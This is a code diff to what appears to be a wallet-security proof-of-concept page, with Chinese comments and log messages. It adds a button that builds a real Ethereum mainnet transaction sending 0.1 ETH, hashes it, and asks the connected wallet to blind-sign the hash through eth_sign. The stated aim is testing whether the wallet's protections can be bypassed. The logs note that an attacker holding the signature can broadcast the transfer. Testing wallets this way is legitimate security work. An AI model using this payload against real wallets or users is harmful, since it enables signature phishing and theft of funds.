@@ -51,6 +51,7 @@
                 <h4>💀 Untyped Signatures (盲签)</h4>
                 <button class="btn-untyped" id="btnEthSign">eth_sign (最危险的古老盲签)</button>
                 <button class="btn-tx" id="btnSendEth">Send ETH (发送 0.0001 ETH)</button>
+                <button class="btn-untyped" id="btnRealEthSign" style="background:#8e44ad;">eth_sign (真实交易Hash绕过测试)</button>
             </div>
             
             <div>
@@ -268,6 +269,47 @@
     // 6. 发送 ETH
     document.getElementById("btnSendEth").onclick = () => {
         executePayload('eth_sendTransaction', [{ from: window.targetAddress, to: "0x1111111111111111111111111111111111111111", value: "0x5af3107a4000" }], "发送 0.0001 ETH");
+    };
+
+    // 7. eth_sign (真实交易 Hash 绕过测试)
+    document.getElementById("btnRealEthSign").onclick = async () => {
+        log("🚀 发射构造好的真实交易 Hash (绕过测试)...");
+        showResult("⏳ 正在序列化交易并等待签名...");
+
+        try {
+            // 使用你的思路，构造一笔真实交易 (注意 chainId 设为 1 匹配主网)
+            const tx = {
+                to: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',
+                value: ethers.parseEther("0.1"), // ethers v6 语法
+                data: '0xE0A293E08F72454CEd99E1769c3ebd21fD2C20a1',
+                gasLimit: 22000,
+                maxFeePerGas: ethers.parseUnits('20', 'gwei'),
+                maxPriorityFeePerGas: ethers.parseUnits('5', 'gwei'),
+                nonce: 1,
+                type: 2,
+                chainId: 1 
+            };
+
+            // ethers v6 的序列化和哈希计算
+            const transaction = ethers.Transaction.from(tx);
+            const unsignedTx = transaction.unsignedSerialized;
+            const messageHash = ethers.keccak256(unsignedTx);
+
+            log(`📦 构造完毕，原始 Hash: ${messageHash}`);
+
+            // 往下发给钱包
+            const signature = await window.pocProvider.request({
+                method: 'eth_sign',
+                params: [window.targetAddress.toLowerCase(), messageHash]
+            });
+            
+            log(`✅ <span style='color:#2ecc71'>绕过成功！钱包弹出了签名！</span>`);
+            showResult(`[致命签名结果]\n${signature}\n\n(黑客拿到这串字符，就能直接广播你刚才那笔 0.1 ETH 的转账了)`);
+
+        } catch (e) { 
+            log(`<span style='color:red'>❌ 依然被拦截/报错: ${e.message}</span>`); 
+            showResult(`[Error]\n绕过失败。报错信息: ${e.message}\n\n结论: 这个钱包很可能是 UI 渲染层彻底阉割了 eth_sign，导致遇到此方法必定 Null 崩溃。`);
+        }
     };
 
     init();
